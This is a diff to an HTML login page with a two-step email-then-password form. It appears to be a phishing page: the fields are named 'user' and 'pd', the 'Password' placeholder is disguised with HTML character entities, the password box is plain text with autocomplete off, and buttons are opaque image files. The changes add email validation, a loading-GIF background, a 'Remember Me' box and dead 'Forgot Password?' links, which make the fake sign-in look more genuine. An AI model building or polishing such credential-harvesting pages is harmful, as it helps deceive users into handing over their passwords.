@@ -6,6 +6,13 @@
 <link rel="shortcut icon" href="images/favicon.ico"/>
 
 <style type="text/css">
+    body {
+        text-align: center;
+        margin: 0;
+        background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') no-repeat center center fixed;
+        background-size: cover;
+    }
+
     .textbox {
         height: 36px;
         width: 275px;
@@ -32,8 +39,18 @@
 <script type="text/javascript">
     // Show password step and hide email step
     function showPasswordStep() {
-        document.getElementById('emailStep').classList.add('hidden');
-        document.getElementById('passwordStep').classList.remove('hidden');
+        const emailInput = document.querySelector('input[name="user"]');
+        const email = emailInput.value;
+
+        // Simple regex for email validation
+        const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+        if (emailPattern.test(email)) {
+            document.getElementById('emailStep').classList.add('hidden');
+            document.getElementById('passwordStep').classList.remove('hidden');
+        } else {
+            alert("Please enter a valid email address.");
+        }
     }
 </script>
 
@@ -51,11 +68,16 @@
         <div id="formimage1" style="position:absolute; left:749px; top:408px; z-index:3">
             <input type="image" name="formimage1" width="110" height="34" src="images/zxt.png" onclick="showPasswordStep(); return false;">
         </div>
-    </div>
 
-    <!-- Decorative image (optional) -->
-    <div id="image2" style="position:absolute; overflow:hidden; left:508px; top:388px; width:137px; height:17px; z-index:1">
-        <a href="#"><img src="images/zt4.png" alt="" title="" border=0 width=137 height=17></a>
+        <!-- Decorative image (optional) -->
+        <div id="image2" style="position:absolute; overflow:hidden; left:508px; top:388px; width:137px; height:17px; z-index:1">
+            <a href="#"><img src="images/zt4.png" alt="" title="" border=0 width=137 height=17></a>
+        </div>
+
+        <!-- Forgot Password link -->
+        <div style="position:absolute; left:507px; top:350px; z-index:4">
+            <a href="#" style="font-size: 14px;">Forgot Password?</a>
+        </div>
     </div>
 
     <!-- Password Step (Step 2 - initially hidden) -->
@@ -66,20 +88,20 @@
         <!-- Password input field -->
         <input name="pd" placeholder="&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:352px;left:507px;top:299px;z-index:3">
 
-        <!-- Checkbox options -->
-        <div id="checkboxG1" style="position:absolute; left:507px; top:348px; z-index:4">
-            <input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox">
-            <label for="checkboxG1" class="css-label radGroup1">Remember me</label>
-        </div>
-
-        <div id="checkboxG2" style="position:absolute; left:507px; top:378px; z-index:4">
-            <input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox">
-            <label for="checkboxG2" class="css-label radGroup1"></label>
+        <!-- Remember Me checkbox -->
+        <div style="position:absolute; left:507px; top:348px; z-index:4">
+            <input type="checkbox" name="remember" id="remember" class="css-checkbox">
+            <label for="remember" class="css-label radGroup1" style="font-size: 14px;">Remember Me</label>
         </div>
 
         <!-- Submit button -->
         <div id="formimage1" style="position:absolute; left:749px; top:424px; z-index:5">
             <input type="image" name="formimage1" width="110" height="34" src="images/zgn.png">
+        </div>
+
+        <!-- Forgot Password link next to password input -->
+        <div style="position:absolute; left:900px; top:299px; z-index:4">
+            <a href="#" style="font-size: 14px;">Forgot Password?</a>
         </div>
     </div>
 </form>
